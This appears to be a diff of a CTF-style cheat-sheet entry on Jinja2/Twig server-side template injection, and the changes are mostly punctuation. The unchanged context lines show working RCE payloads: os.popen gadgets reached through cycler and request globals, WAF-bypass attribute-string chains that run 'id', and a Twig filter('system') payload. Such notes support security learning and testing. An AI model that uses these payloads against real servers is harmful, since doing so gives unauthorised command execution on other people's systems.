@@ -4,7 +4,7 @@ category: WEB
 tags: [ssti, template-injection, jinja2, twig, flask, server-side, rce, polyglot, 7x7, mro, cycler]
 tools: []
 manuals: []
-title: "SSTI — Server-Side Template Injection (Jinja2 → RCE)"
+title: "SSTI: Server-Side Template Injection (Jinja2 → RCE)"
 difficulty: medium
 created: 2026-10-04
 updated: 2026-10-04
@@ -34,7 +34,7 @@ Send `{{7*7}}`. If it returns `49`, it's Jinja-like. To tell Jinja2 (Python) fro
 ```
 Read the flag directly: `{{ cycler.__init__.__globals__.os.popen('cat /flag.txt').read() }}`.
 
-### 3. If a WAF blocks `_`/`.`/`[` — attributes by string
+### 3. If a WAF blocks `_`/`.`/`[`: attributes by string
 ```jinja
 {{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
 {{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
@@ -43,11 +43,11 @@ Read the flag directly: `{{ cycler.__init__.__globals__.os.popen('cat /flag.txt'
 ## Gotchas
 
 - **Don't confuse it with XSS**: `{{7*7}}` rendering `49` is SSTI (the server evaluates it); if literal
-  `{{7*7}}` shows up but `<b>x</b>` renders, it's XSS (client) — a different vector.
-- The `__mro__` index and the `Popen`/`os._wrap_close` subclass **vary by Python version** — so
+  `{{7*7}}` shows up but `<b>x</b>` renders, it's XSS (client), a different vector.
+- The `__mro__` index and the `Popen`/`os._wrap_close` subclass **vary by Python version**, so
   prefer the `cycler`/`request` gadget (stable) over indexing `__subclasses__()` by hand.
 - Twig/FreeMarker have their own RCE payloads (`{{['id']|filter('system')}}` in Twig,
-  `freemarker.template.utility.Execute` in FreeMarker) — identify the engine first.
+  `freemarker.template.utility.Execute` in FreeMarker); identify the engine first.
 - A template sandbox may block some gadgets; test more than one `__globals__` path.
 
 ## Cross-reference
